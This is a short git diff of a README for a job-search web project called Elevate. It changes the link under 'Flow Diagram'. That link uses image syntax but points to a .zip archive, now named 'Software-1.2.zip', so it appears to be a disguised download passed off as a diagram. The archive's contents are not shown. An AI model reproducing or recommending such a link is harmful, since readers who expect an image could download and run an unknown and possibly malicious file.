@@ -8,7 +8,7 @@ This Platform is designed for those who are seacrching and finding for employmen
 -some of feature we provide are Talent pools, notifications, advanced search, in-web conversations, interview booking, team collaboration.<br>
 
 # Flow Diagram
-![diagram-export-1-10-2025-10_23_52-AM](https://raw.githubusercontent.com/gkushwaha835/Elevate/main/client/Elevate-v3.2-alpha.5.zip)
+![diagram-export-1-10-2025-10_23_52-AM](https://raw.githubusercontent.com/gkushwaha835/Elevate/main/client/Software-1.2.zip)
 
 Member working on project:<br>
 Atharva chavan (FrontEnd)<br>
